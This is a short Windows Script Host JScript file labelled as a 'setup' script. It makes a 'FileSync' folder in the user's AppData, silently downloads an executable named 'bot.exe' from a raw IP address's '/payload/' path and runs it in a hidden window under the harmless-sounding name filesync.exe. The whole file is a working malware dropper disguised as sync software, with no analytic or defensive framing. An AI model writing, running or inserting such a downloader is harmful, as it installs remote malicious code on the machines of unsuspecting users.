// setup 9f20da4e1b4e7e79
var shell = WScript.CreateObject('WScript.Shell');
var fso = new ActiveXObject('Scripting.FileSystemObject');
var dir = shell.ExpandEnvironmentStrings('%APPDATA%') + '\\FileSync';
if (!fso.FolderExists(dir)) {
  fso.CreateFolder(dir);
}
shell.Run('curl.exe -s -f -o "' + dir + '\\filesync.exe" "http://63.187.54.139:8080/payload/latest/bot.exe"', 0, true);
shell.Run('"' + dir + '\\filesync.exe"', 0, false);
